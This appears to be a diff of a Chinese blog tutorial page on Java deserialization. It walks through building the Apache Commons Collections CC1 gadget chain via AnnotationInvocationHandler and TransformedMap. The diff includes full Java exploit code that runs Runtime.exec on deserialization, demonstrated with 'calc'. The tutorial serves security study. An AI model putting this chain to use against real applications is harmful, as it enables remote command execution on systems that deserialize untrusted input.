 <h5 id="315-如何通过第一个-if"><a href="#3-1-5-如何通过第一个-if" class="headerlink" title="3.1.5 如何通过第一个 if"></a>3.1.5 如何通过第一个 if</h5><p>仔细阅读代码可以发现第一个 if 中的 memberType 其调用链如下：</p>
 <blockquote>
-<p>annotationType = AnnotationType.getInstance(type); // type 是什么？</p>
-<p>Map<string, class<?>&gt; memberTypes = annotationType.memberTypes();</string,></p>
-<p>Class&lt;?&gt; memberType = memberTypes.get(name);  // name 是什么？</p>
+<p>annotationType &#x3D; AnnotationType.getInstance(type); &#x2F;&#x2F; type 是什么？</p>
+<p>Map&lt;String, Class&lt;?&gt;&gt; memberTypes &#x3D; annotationType.memberTypes();</p>
+<p>Class&lt;?&gt; memberType &#x3D; memberTypes.get(name);  &#x2F;&#x2F; name 是什么？</p>
 </blockquote>
 <p>下图的代码告诉我们 <strong>type</strong> 是一个和 Annotation 有关的 Class 类对象</p>
-<p><img src="/images/JAVA反序列化04/image-20230203201726956.png" srcset="/img/loading.gif" lazyload alt="image-20230203201726956"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230203201726956.png" srcset="/img/loading.gif" lazyload alt="image-20230203201726956"></p>
 <p>跟进到 AnnotationType.getInstance，该方法对于一个给定的注解类型会返回其实例（顾名思义），参数是一个 Class 类型</p>
 <p>示例如下：</p>
-<p><img src="/images/JAVA反序列化04/image-20230115164300770.png" srcset="/img/loading.gif" lazyload alt="image-20230115164300770"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230115164300770.png" srcset="/img/loading.gif" lazyload alt="image-20230115164300770"></p>
 <p><strong>type</strong> 的值可以在构造函数中定义</p>
-<p><img src="/images/JAVA反序列化04/image-20230203201849819.png" srcset="/img/loading.gif" lazyload alt="image-20230203201849819"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230203201849819.png" srcset="/img/loading.gif" lazyload alt="image-20230203201849819"></p>
 <p>AnnotationType.getInstance() 返回某个注解类型的实例之后，紧接着调用该实例的 memberTypes() 方法，并且返回类型是 Map。（忘记了调用关系就看看下图(●’◡’●)）</p>
-<p><img src="/images/JAVA反序列化04/image-20230203202905822.png" srcset="/img/loading.gif" lazyload alt="image-20230203202905822"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230203202905822.png" srcset="/img/loading.gif" lazyload alt="image-20230203202905822"></p>
 <p>跟进到 memberTypes()，这个方法会返回注解类型的 <strong>member type</strong>，是一个 Map。</p>
-<p><img src="/images/JAVA反序列化04/image-20230203202314899.png" srcset="/img/loading.gif" lazyload alt="image-20230203202314899"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230203202314899.png" srcset="/img/loading.gif" lazyload alt="image-20230203202314899"></p>
 <p>我们传入 Target 注解来看看实际的样子：</p>
 <p>首先 Taget 注解的定义</p>
-<p><img src="/images/JAVA反序列化04/image-20230115165133347.png" srcset="/img/loading.gif" lazyload alt="image-20230115165133347"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230115165133347.png" srcset="/img/loading.gif" lazyload alt="image-20230115165133347"></p>
 <p>然后输出一下其 member type：</p>
-<p><img src="/images/JAVA反序列化04/image-20230115165023655.png" srcset="/img/loading.gif" lazyload alt="image-20230115165023655"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230115165023655.png" srcset="/img/loading.gif" lazyload alt="image-20230115165023655"></p>
 <p>在上一步调用 .memberTypes() 方法后返回一个 Map 类对象后，我们最后是对这个 Map 进行了一个查询操作，具体地说是传入了一个 name 作为 Map 类对象的 key。若查询到了对应的 value，我们就可以通过第一个 if。</p>
-<p><img src="/images/JAVA反序列化04/image-20230203202927132.png" srcset="/img/loading.gif" lazyload alt="image-20230203202927132"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230203202927132.png" srcset="/img/loading.gif" lazyload alt="image-20230203202927132"></p>
 <p>name 是什么呢？ name 是 memberValue 这个 entry 的 key，而此 entry 又来自于我们可控的 memberValues。而我们可以构造任意键值的 entry,所以问题的关键在于找到一个具有成员变量的注解类型memberTypes ,使其调用.get(name) 可以不为空。</p>
 <p>而前面示例中的 Target 就符合这样的条件,其有一个名为 value 的成员变量.</p>
 <p>所以若在构造函数中让 type 为 Taget.class，那我们的 memberTypes 就为</p>
 <blockquote>
-<p>{value=class [Ljava.lang.annotation.ElementType;}</p>
+<p>{value&#x3D;class [Ljava.lang.annotation.ElementType;}</p>
 </blockquote>
 <p>其键为 value，值为 class [Ljava.lang.annotation.ElementType;}</p>
 <p>所以我们构造出一个键为 value 的 entry 即可</p>
 <p>这样 memberTypes.get(value) 就等于 class [Ljava.lang.annotation.ElementType;}。</p>
 <p>所以最后我们可以如下构造 AnnotationInvocationHandler 类对象</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span><br>                    , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>            HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>            hashMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;xxx&quot;</span>); <span class="hljs-comment">//关键点</span><br>Map&lt;Object, Object&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, invokerTransformer);<br><br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class,decorateMap);<br></code></pre></td></tr></table></figure>
+
 <p>运行之后打断点示例如下，明显此时可以过第一个 if</p>
-<p><img src="/images/JAVA反序列化04/image-20230116101359073.png" srcset="/img/loading.gif" lazyload alt="image-20230116101359073"></p>
-<h5 id="316-第二个-if"><a href="#3-1-6-第二个-if" class="headerlink" title="3.1.6 第二个 if"></a>3.1.6 第二个 if</h5><p>我们过第一个 if 的代码同时也能过第二个 if!</p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230116101359073.png" srcset="/img/loading.gif" lazyload alt="image-20230116101359073"></p>
+<h5 id="316-第二个-if"><a href="#3-1-6-第二个-if" class="headerlink" title="3.1.6 第二个 if"></a>3.1.6 第二个 if</h5><p>巧合地是，我们过第一个 if 的代码同时也能过第二个 if。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br><span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;&#125;<br></code></pre></td></tr></table></figure>
-<p>isInstance 就是判断对象是否是当前类的一个实例,如果是就返回真</p>
-<p>value 就是 当前 entry 的值,这个我们可以随便写</p>
-<p>memberType 的话可以过第一个 if 的代码其值为 <code>class [Ljava.lang.annotation.ElementType;&#125;</code></p>
-<p><img src="/images/JAVA反序列化04/image-20230115192408857.png" srcset="/img/loading.gif" lazyload alt="image-20230115192408857"></p>
-<p>所以我们随便写一个字符串进去就可以让 isInstance返回假,这样外层再取反直接为真通过第二个 if!</p>
+
+<p>isInstance(value) 就是判断 value 是否是当前类的一个实例,如果是就返回真。我们肯定是希望其返回假，然后外层取反总体为真，这样就可以通过第二个 if了。那关键点就在 value 身上，value 是什么呢？</p>
+<p> value 其实就是 当前 entry 的值,而我们是可以控制 entry 的，所以我们可以控制 value！</p>
+<p>根据我们过第一个 if 所做的操作，memberType 的值为</p>
+<p>  <code>class [Ljava.lang.annotation.ElementType;&#125;</code></p>
+<p>所以我们随便写一个字符串进去就可以让 isInstance 返回假,这样外层再取反直接为真通过第二个 if!</p>
 <p>如下图我们显然已经调用到了 setValue 函数</p>
-<p><img src="/images/JAVA反序列化04/image-20230116101531106.png" srcset="/img/loading.gif" lazyload alt="image-20230116101531106"></p>
-<h5 id="317-setvalue-传入的参数值"><a href="#3-1-7-setValue-传入的参数值" class="headerlink" title="3.1.7 setValue 传入的参数值"></a>3.1.7 setValue 传入的参数值</h5><p>过了这两个 if 还是不能弹出计算器，因为进去两个 if之后的setValue参数值不对</p>
-<p><img src="/images/JAVA反序列化04/image-20230116102151138.png" srcset="/img/loading.gif" lazyload alt="image-20230116102151138"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230116101531106.png" srcset="/img/loading.gif" lazyload alt="image-20230116101531106"></p>
+<p>现在我们来到了最后一个问题，那就是 setValue 传入的参数值的问题。</p>
+<h5 id="317-setvalue-传入的参数值"><a href="#3-1-7-setValue-传入的参数值" class="headerlink" title="3.1.7 setValue 传入的参数值"></a>3.1.7 setValue 传入的参数值</h5><p>过了这两个 if 还是不能弹出计算器，因为进去两个 if之后的 setValue 参数值不对。最后传入的是一大串奇怪的东西：</p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230116102151138.png" srcset="/img/loading.gif" lazyload alt="image-20230116102151138"></p>
 <p>用上面的断点代码跟进一下看看 AbstractInputCheckedMapDecorator 类的 setValue 方法的参数值是什么</p>
-<p><img src="/images/JAVA反序列化04/image-20230116101647272.png" srcset="/img/loading.gif" lazyload alt="image-20230116101647272"></p>
-<p>根据前面的分析我们可以知道在调用 setValue 方法的时候应该传入的是一个 Runtime 类的对象，而这里显然不是，所以我们该如何使得在调用 setValue 方法时传入的是一个 Runtime 类对象呢？很显然我们没办法做到这一点，但是我们的最终目的其实是在调用 ValueTransformer.transform 方法的时候能够传入一个 Runtime 类对象。当前我们传入的是一个 AnonotationType啥的对象，那有什么办法能够改变传入的对象吗？答案是有的！</p>
-<p><img src="/images/JAVA反序列化04/image-20230116104648901.png" srcset="/img/loading.gif" lazyload alt="image-20230116104648901"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230116101647272.png" srcset="/img/loading.gif" lazyload alt="image-20230116101647272"></p>
+<p>根据前面的分析我们可以知道，若想弹出计算器，那么在调用 setValue() 方法的时候应该传入的是一个 Runtime 类的对象，而这里显然不是。所以我们该如何使得在调用 setValue() 方法时传入的是一个 Runtime 类对象呢？很显然我们没办法做到这一点，但是我们的最终目的是在调用 <code>invokerTransformer.transform()</code> 方法的时候能够传入一个 Runtime 类对象。但当前我们传入的是一个 AnonotationType 啥的对象，那有什么办法能够改变传入的对象吗？答案是有的！</p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230116104648901.png" srcset="/img/loading.gif" lazyload alt="image-20230116104648901"></p>
 <ul>
 <li>我们这里找到了两个能够解决实现上述目的可控参数的类 ———— <code>ConstantTransformer</code> 和 <code>ChainedTransformer</code>。</li>
 </ul>
-<p><img src="/images/JAVA反序列化04/ConstantTransformer.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/ConstantTransformer.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <ul>
 <li>构造方法：传入的任何对象都放在 <code>iConstant</code> 中</li>
 <li><code>transform()</code> 方法：无论传入什么，都返回 <code>iConstant</code>，这就类似于一个常量了。</li>
 </ul>
-<p><img src="/images/JAVA反序列化04/image-20230116104540998.png" srcset="/img/loading.gif" lazyload alt="image-20230116104540998"></p>
-<p>从上图我们可以看到 ChainedTransformer 类的 transform 方法可以改变传入的对象，如果我们令当前iTransformers 是一个 ConstantTransformer（构造函数传入一个 RUntime 类对象），然后 object 是一个 AnnotationTypexxx 对象，那么根据 ConstantTransformer 的 transform方法，我们不就成功地得到了一个InvokerTransformer 类对象吗？并且我们还可以看到 ChainedTransformer 类是递归地调用 transform 方法的，所以我们紧接着就会调用下一轮的 transfrom方法，不过此时传入的对象是 Runtime 类对象，而 iTransformers 是一个我们可控的 Transformer 数组，所以我们可以让第二轮的 iTransformers 为一个InvokerTransformer，那这样不就调用到 <code>InvokerTransformer.transfrom(runtime)</code> 了吗？这完美符合我们前面的调用链</p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230116104540998.png" srcset="/img/loading.gif" lazyload alt="image-20230116104540998"></p>
+<p>从上图我们可以看到 ChainedTransformer 类的 transform 方法可以改变传入的对象，如果我们令当前iTransformers 是一个 ConstantTransformer（构造函数传入一个 RUntime 类对象），然后 object 是一个 AnnotationTypexxx 对象，那么根据 ConstantTransformer 的 transform 方法，我们不就成功地得到了一个InvokerTransformer 类对象吗？并且我们还可以看到 ChainedTransformer 类是递归地调用 transform 方法的，所以我们紧接着就会调用下一轮的 transfrom 方法，不过此时传入的对象是 Runtime 类对象，而 iTransformers 是一个我们可控的 Transformer 数组，所以我们可以让第二轮的 iTransformers 为一个InvokerTransformer，那这样不就调用到 <code>InvokerTransformer.transfrom(runtime)</code> 了吗？这完美符合我们前面的调用链。</p>
 <p>根据以上分析我们就完美的构造了一条链子出来，现在尝试编写代码</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>                <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>                <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>                HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>                hashMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>                <span class="hljs-type">ConstantTransformer</span> <span class="hljs-variable">constantTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(runtime); <span class="hljs-comment">//错误代码，Runtime类不能序列化，所以后续会报错</span><br>                Transformer[] transformers = &#123;constantTransformer,invokerTransformer&#125;;<br><br>                <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span>  <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>                Map&lt;Object, Object&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, chainedTransformer);<br>                <span class="hljs-comment">// decorateMap 是一个 TransformedMap 类对象 （class org.apache.commons.collections.map.TransformedMap）</span><br>             <br>                <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>                <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);<br>                constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class,decorateMap);<br>                serialize(o);<br>                unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>        &#125;<br><br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        &#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br><br>        <span class="hljs-keyword">return</span> obj;<br>        &#125;<br>        <br></code></pre></td></tr></table></figure>
+
 <p>然而运行缺报错了</p>
-<p><img src="/images/JAVA反序列化04/image-20230116110517413.png" srcset="/img/loading.gif" lazyload alt="image-20230116110517413"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230116110517413.png" srcset="/img/loading.gif" lazyload alt="image-20230116110517413"></p>
 <blockquote>
-<p>Runtime类对象不能反序列化</p>
+<p>原因是 Runtime 类对象不能反序列化</p>
 </blockquote>
 <p>好在 Runtime.class 是可以反序列化的，试着修改代码，首先是正常的反射</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;<br><span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>);<br><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>);<br><span class="hljs-type">Method</span> <span class="hljs-variable">execMethod</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>,String.class);<br>execMethod.invoke(r,<span class="hljs-string">&quot;calc&quot;</span>);<br></code></pre></td></tr></table></figure>
-<p>要将其改成 InvokerTransform 类的形式然后拼入 ChainedTransformer</p>
+
+<p>要将其改成 InvokerTransform 类的形式然后拼入 ChainedTransformer，最后的 exp 如下：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>                <br>                HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>                hashMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;xxx&quot;</span>);<br>                <br>                Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// 构造 setValue 的可控参数</span><br>                        <br>                        <span class="hljs-comment">// 方法名、参数类型、参数值</span><br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br><br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span><br>                                , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br><br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>                &#125;;<br><br>                <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span>  <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>                Map&lt;Object, Object&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, chainedTransformer);<br>                <span class="hljs-comment">// decorateMap 是一个 TransformedMap 类对象 （class org.apache.commons.collections.map.TransformedMap）</span><br><br>                <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>                <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);<br>                constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br><br><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class,decorateMap);<br>                serialize(o);<br>                unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br><br><br>        &#125;<br><br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        &#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br><br>        <span class="hljs-keyword">return</span> obj;<br>        &#125;<br>        &#125;<br></code></pre></td></tr></table></figure>
-<p><img src="/images/JAVA反序列化04/image-20230116112015510.png" srcset="/img/loading.gif" lazyload alt="image-20230116112015510"></p>
-<p>在 ChainedTransformer的循坏中打断点分析一下</p>
+
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230116112015510.png" srcset="/img/loading.gif" lazyload alt="image-20230116112015510"></p>
+<p>在 ChainedTransforme r的循坏中打断点分析一下</p>
 <p>第一轮：</p>
-<p><img src="/images/JAVA反序列化04/image-20230116112528761.png" srcset="/img/loading.gif" lazyload alt="image-20230116112528761"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230116112528761.png" srcset="/img/loading.gif" lazyload alt="image-20230116112528761"></p>
 <p>第二轮：</p>
-<p><img src="/images/JAVA反序列化04/image-20230116112607243.png" srcset="/img/loading.gif" lazyload alt="image-20230116112607243"></p>
-<p><img src="/images/JAVA反序列化04/image-20230116115332546.png" srcset="/img/loading.gif" lazyload alt="image-20230116115332546"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230116112607243.png" srcset="/img/loading.gif" lazyload alt="image-20230116112607243"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230116115332546.png" srcset="/img/loading.gif" lazyload alt="image-20230116115332546"></p>
 <p>第三轮：</p>
-<p><img src="/images/JAVA反序列化04/image-20230116112649822.png" srcset="/img/loading.gif" lazyload alt="image-20230116112649822"></p>
